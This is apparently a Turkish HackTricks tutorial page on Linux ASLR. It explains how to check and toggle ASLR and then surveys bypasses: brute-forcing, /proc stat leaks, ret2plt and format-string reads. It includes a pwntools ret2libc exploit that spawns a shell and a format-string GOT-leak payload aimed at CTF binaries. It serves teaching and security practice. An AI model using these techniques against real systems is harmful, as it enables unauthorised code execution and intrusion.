# ASLR

{{#include ../../../../banners/hacktricks-training.md}}

## Temel Bilgiler

**Adres Alanı Düzeni Rastgeleleştirme (ASLR)**, işletim sistemlerinde kullanılan bir güvenlik tekniğidir ve **sistem ve uygulama süreçleri** tarafından kullanılan bellek adreslerini rastgele hale getirir. Bu sayede, bir saldırganın belirli süreçlerin ve verilerin, örneğin yığın, yığın bellek ve kütüphaneler gibi, konumunu tahmin etmesi önemli ölçüde zorlaşır ve bu da belirli türdeki istismarları, özellikle de tampon taşmalarını azaltır.

### **ASLR Durumunu Kontrol Etme**

Bir Linux sisteminde ASLR durumunu **kontrol etmek** için, `/proc/sys/kernel/randomize_va_space` dosyasındaki değeri okuyabilirsiniz. Bu dosyada saklanan değer, uygulanan ASLR türünü belirler:

- **0**: Rastgeleleştirme yok. Her şey statik.
- **1**: İhtiyatlı rastgeleleştirme. Paylaşılan kütüphaneler, yığın, mmap(), VDSO sayfası rastgeleleştirilmiştir.
- **2**: Tam rastgeleleştirme. İhtiyatlı rastgeleleştirme ile rastgeleleştirilen unsurlara ek olarak, `brk()` ile yönetilen bellek rastgeleleştirilmiştir.

ASLR durumunu aşağıdaki komut ile kontrol edebilirsiniz:
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **ASLR'yi Devre Dışı Bırakma**

ASLR'yi **devre dışı bırakmak** için `/proc/sys/kernel/randomize_va_space` değerini **0** olarak ayarlarsınız. ASLR'yi devre dışı bırakmak, genellikle test veya hata ayıklama senaryoları dışında önerilmez. İşte bunu nasıl yapabileceğiniz:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
ASLR'yi bir yürütme için de devre dışı bırakabilirsiniz:
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **ASLR'yi Etkinleştirme**

ASLR'yi **etkinleştirmek** için, `/proc/sys/kernel/randomize_va_space` dosyasına **2** değerini yazabilirsiniz. Bu genellikle root ayrıcalıkları gerektirir. Tam rastgeleleştirme, aşağıdaki komutla yapılabilir:
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **Yeniden Başlatmalarda Süreklilik**

`echo` komutlarıyla yapılan değişiklikler geçicidir ve yeniden başlatıldığında sıfırlanır. Değişikliği kalıcı hale getirmek için `/etc/sysctl.conf` dosyasını düzenlemeniz ve aşağıdaki satırı eklemeniz veya değiştirmeniz gerekir:
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
`/etc/sysctl.conf` dosyasını düzenledikten sonra, değişiklikleri uygulamak için:
```bash
sudo sysctl -p
```
Bu, ASLR ayarlarınızın yeniden başlatmalar arasında kalmasını sağlayacaktır.

## **Atlatmalar**

### 32bit brute-forcing

PaX, işlem adres alanını **3 gruba** ayırır:

- **Kod ve veri** (başlatılmış ve başlatılmamış): `.text`, `.data` ve `.bss` —> `delta_exec` değişkeninde **16 bit** entropi. Bu değişken, her işlemle rastgele başlatılır ve başlangıç adreslerine eklenir.
- `mmap()` ile tahsis edilen **bellek** ve **paylaşılan kütüphaneler** —> **16 bit**, `delta_mmap` olarak adlandırılır.
- **Yığın** —> **24 bit**, `delta_stack` olarak adlandırılır. Ancak, etkili olarak **11 bit** kullanır (10. bayttan 20. bayta kadar dahil), **16 bayt** hizalıdır —> Bu, **524,288 olası gerçek yığın adresi** ile sonuçlanır.

Önceki veriler 32-bit sistemler içindir ve azaltılmış nihai entropi, istismar başarılı bir şekilde tamamlanana kadar yürütmeyi tekrar tekrar denemek suretiyle ASLR'yi atlatmayı mümkün kılar.

#### Brute-force fikirleri:

- Eğer shellcode'dan önce **büyük bir NOP kaydı** barındıracak kadar büyük bir taşma varsa, yığında adresleri brute-force yaparak akışın **NOP kaydının bir kısmının üzerinden atlamasını** sağlayabilirsiniz.
- Taşma o kadar büyük değilse ve istismar yerel olarak çalıştırılabiliyorsa, **NOP kaydını ve shellcode'u bir ortam değişkenine eklemek** mümkündür.
- Eğer istismar yerel ise, libc'nin temel adresini brute-force yapmayı deneyebilirsiniz (32bit sistemler için yararlıdır):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
- Uzak bir sunucuya saldırıyorsanız, **`usleep` `libc` fonksiyonunun adresini brute-force etmeyi** deneyebilirsiniz, argüman olarak 10 (örneğin) geçerek. Eğer bir noktada **sunucu yanıt vermek için 10 saniye ekstra alıyorsa**, bu fonksiyonun adresini bulmuşsunuzdur.

> [!TIP]
> 64 bit sistemlerde entropi çok daha yüksektir ve bu mümkün değildir.

### Yerel Bilgiler (`/proc/[pid]/stat`)

Bir sürecin **`/proc/[pid]/stat`** dosyası her zaman herkes tarafından okunabilir ve **ilginç** bilgiler içerir, örneğin:

- **startcode** & **endcode**: İkili dosyanın **TEXT**'inin üstünde ve altında adresler
- **startstack**: **stack**'in başlangıç adresi
- **start_data** & **end_data**: **BSS**'nin üstünde ve altında adresler
- **kstkesp** & **kstkeip**: Mevcut **ESP** ve **EIP** adresleri
- **arg_start** & **arg_end**: **cli argümanlarının** üstünde ve altında adresler.
- **env_start** & **env_end**: **env değişkenlerinin** üstünde ve altında adresler.

Bu nedenle, eğer saldırgan, istismar edilen ikili dosyanın bulunduğu bilgisayarda ise ve bu ikili dosya ham argümanlardan taşmayı beklemiyorsa, ancak bu dosyayı okuduktan sonra oluşturulabilecek farklı bir **girdi**'den bekliyorsa, bir saldırganın **bu dosyadan bazı adresleri alması ve bunlardan istismar için ofsetler oluşturması mümkündür**.

> [!TIP]
> Bu dosya hakkında daha fazla bilgi için [https://man7.org/linux/man-pages/man5/proc.5.html](https://man7.org/linux/man-pages/man5/proc.5.html) adresinde `/proc/pid/stat` araması yapın.

### Bir leak'e sahip olmak

- **Zorluk bir leak vermektir**

Eğer size bir leak verilirse (kolay CTF zorlukları), ondan ofsetleri hesaplayabilirsiniz (örneğin, istismar ettiğiniz sistemde kullanılan tam libc sürümünü bildiğinizi varsayarak). Bu örnek istismar, [**buradan örnek**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak) alınmıştır (daha fazla ayrıntı için o sayfaya bakın):
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
- **ret2plt**

Bir buffer overflow kullanarak, libc'den bir fonksiyonun adresini dışarı sızdırmak için bir **ret2plt** istismar etmek mümkün olacaktır. Kontrol et:

{{#ref}}
ret2plt.md
{{#endref}}

- **Format Strings Arbitrary Read**

ret2plt'de olduğu gibi, bir format string zafiyeti aracılığıyla rastgele bir okuma varsa, GOT'dan bir **libc fonksiyonu** adresini dışarı sızdırmak mümkündür. Aşağıdaki [**örnek buradan**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got):
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
Format Strings rastgele okuma hakkında daha fazla bilgi bulabilirsiniz:

{{#ref}}
../../format-strings/
{{#endref}}

### Ret2ret & Ret2pop

Yığın içindeki adresleri kullanarak ASLR'yi atlatmayı deneyin:

{{#ref}}
../../stack-overflow/ret2ret.md
{{#endref}}

{{#include ../../../../banners/hacktricks-training.md}}
